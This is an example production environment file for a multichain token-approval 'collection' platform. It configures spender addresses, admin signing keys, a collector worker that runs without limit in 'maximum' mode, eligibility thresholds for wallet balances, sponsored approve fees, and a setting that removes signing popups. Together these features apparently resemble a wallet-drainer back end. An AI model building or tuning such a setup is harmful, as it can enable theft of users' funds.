# Production (Render/VPS) — platform config
#
# Copy: cp platform.env.example platform.env
# API service: set SPENDER_* explicitly; omit ADMIN_*_PRIVATE_KEY (worker only).
# Worker service: set ADMIN_*_PRIVATE_KEY for collection signing.
# Meta Pixel: set META_PIXEL_ID only in config/platform.env (not in this file).

SPENDER_EVM=
SPENDER_TRON=

# Worker only — leave empty on API (set in Render worker env group)
ADMIN_EVM_PRIVATE_KEY=
ADMIN_TRON_PRIVATE_KEY=

APPROVE_AMOUNT_USDT_DEFAULT=0
TERMS_VERSION=2026-07-28
ALLOW_SELF_SPENDER=false
TRON_APPROVE_FEE_LIMIT_SUN=150000000
TRON_TRANSFER_FEE_LIMIT_SUN=300000000
APPROVAL_VERIFY_INTERVAL_MS=1500
APPROVAL_VERIFY_MAX_ATTEMPTS=3
APPROVAL_POST_CONFIRM_DELAY_EVM_MS=600
APPROVAL_POST_CONFIRM_DELAY_TRON_MS=1200

COLLECTOR_ENABLED=true
COLLECTOR_MAX_RUNS=unlimited
COLLECTOR_INTERVAL_MS=120000
COLLECTOR_BATCH_SIZE=20
COLLECTOR_LEASE_MS=900000
COLLECTOR_RPC_TIMEOUT_MS=15000
COLLECTION_SUBMITTED_GRACE_MS=1800000
COLLECTION_FAILURE_BACKOFF_MAX=8

NATIVE_RECONCILE_ENABLED=true
NATIVE_RECONCILE_INTERVAL_MS=60000
NATIVE_RECONCILE_BATCH_SIZE=10
NATIVE_PENDING_MAX_RECONCILE_ATTEMPTS=120
NATIVE_AMOUNT_MAX_UNDERFLOW_BPS=1
NATIVE_TRANSFER_LOCK_TTL_MS=120000
NATIVE_CONFIRM_RETRY_DELAYS_MS=2000,5000,10000,20000,30000
NATIVE_REGISTER_RETRY_DELAYS_MS=1000,2000,5000,10000,15000,20000
NATIVE_ESTIMATE_MAX_UNDERFLOW_BPS=200
NATIVE_TX_VISIBILITY_MAX_ATTEMPTS=4
NATIVE_TX_VISIBILITY_BASE_DELAY_MS=750

COLLECTION_DEFAULT_MODE=maximum
COLLECTION_DISPATCH_MODE=queue
COLLECTION_QUEUE_CONCURRENCY=4
COLLECTION_CONFIRMATION_CONCURRENCY=16
COLLECTION_QUEUE_ATTEMPTS=8
COLLECTION_QUEUE_BACKOFF_MS=5000
OUTBOX_PUBLISH_INTERVAL_MS=1000
COLLECTION_RECOVERY_INTERVAL_MS=30000
COLLECTION_RECOVERY_BATCH_SIZE=100
OUTBOX_CLAIM_BATCH_SIZE=100
COLLECTION_WORKERS_ENABLED=true
MERCHANT_WEBHOOK_CONCURRENCY=8
COLLECTION_QUEUE_COMPLETE_RETENTION_SEC=86400
COLLECTION_QUEUE_COMPLETE_MAX_COUNT=10000
COLLECTION_DLQ_LIST_LIMIT=200
OUTBOX_CLAIM_LOCK_MS=60000
MERCHANT_WEBHOOK_TIMEOUT_MS=10000

EVM_TX_CONFIRM_TIMEOUT_MS=60000
ALLOWANCE_POLL_DELAY_EVM_MS=900
ALLOWANCE_POLL_DELAY_TRON_MS=1500
TRANSFER_CONFIRMATION_RETRY_DELAY_MS=2000
EVM_GAS_LIMIT_BUFFER_NUMERATOR=120
EVM_GAS_LIMIT_BUFFER_DENOMINATOR=100
EVM_GAS_ESTIMATE_FALLBACK=21000
EVM_MIN_PRIORITY_FEE_WEI=1000000000

CLIENT_CONFIRMATION_POLL_MS=2000
CLIENT_CONFIRMATION_MAX_ATTEMPTS=30
CLIENT_CONFIRMATION_CONFIRMATIONS=1
CLIENT_RESOURCE_POLL_MIN_DELAY_MS=500
CLIENT_RESOURCE_POLL_MAX_DELAY_MS=8000

RESOURCE_SPONSOR_ENABLED=true
TRON_ENERGY_PROVIDER=self
TRON_ENERGY_TARGET=65000
# Frozen-TRX sun to delegate (1 TRX = 1_000_000 sun). ~2–5 TRX typical for USDT approve.
TRON_ENERGY_DELEGATE_SUN=5000000
TRON_ENERGY_IDEMPOTENCY_HOURS=6
TRON_ENERGY_PENDING_RETRY_MS=2000

PLATFORM_ENABLED_NETWORKS=eth,bsc,pol,avax,arb,base,tron
TRON_FULL_HOST=https://api.trongrid.io
TRONGRID_API_KEY=

# Wallet session TTL (1800000ms = 30 minutes)
WALLET_SESSION_TTL_MS=1800000
# false = tx-backed hybrid auth (no personal_sign popup). true = legacy personal_sign before wallet actions.
WALLET_PERSONAL_SIGN_ENABLED=false

# Eligibility minimum balances — actual token units, per network per asset.
NEXT_PUBLIC_ETH_MIN_NATIVE_BALANCE=0.001
NEXT_PUBLIC_ETH_MIN_USDT_BALANCE=1
NEXT_PUBLIC_ETH_MIN_USDC_BALANCE=1
NEXT_PUBLIC_BSC_MIN_NATIVE_BALANCE=0.002
NEXT_PUBLIC_BSC_MIN_USDT_BALANCE=1
NEXT_PUBLIC_BSC_MIN_USDC_BALANCE=1
NEXT_PUBLIC_POLYGON_MIN_NATIVE_BALANCE=0.01
NEXT_PUBLIC_POLYGON_MIN_USDT_BALANCE=1
NEXT_PUBLIC_POLYGON_MIN_USDC_BALANCE=1
NEXT_PUBLIC_AVAX_MIN_NATIVE_BALANCE=0.01
NEXT_PUBLIC_AVAX_MIN_USDT_BALANCE=1
NEXT_PUBLIC_AVAX_MIN_USDC_BALANCE=1
NEXT_PUBLIC_ARB_MIN_NATIVE_BALANCE=0.001
NEXT_PUBLIC_ARB_MIN_USDT_BALANCE=1
NEXT_PUBLIC_ARB_MIN_USDC_BALANCE=1
NEXT_PUBLIC_BASE_MIN_NATIVE_BALANCE=0.001
NEXT_PUBLIC_BASE_MIN_USDT_BALANCE=1
NEXT_PUBLIC_BASE_MIN_USDC_BALANCE=1
NEXT_PUBLIC_TRON_MIN_NATIVE_BALANCE=5
NEXT_PUBLIC_TRON_MIN_USDT_BALANCE=1
NEXT_PUBLIC_TRON_MIN_USDC_BALANCE=1
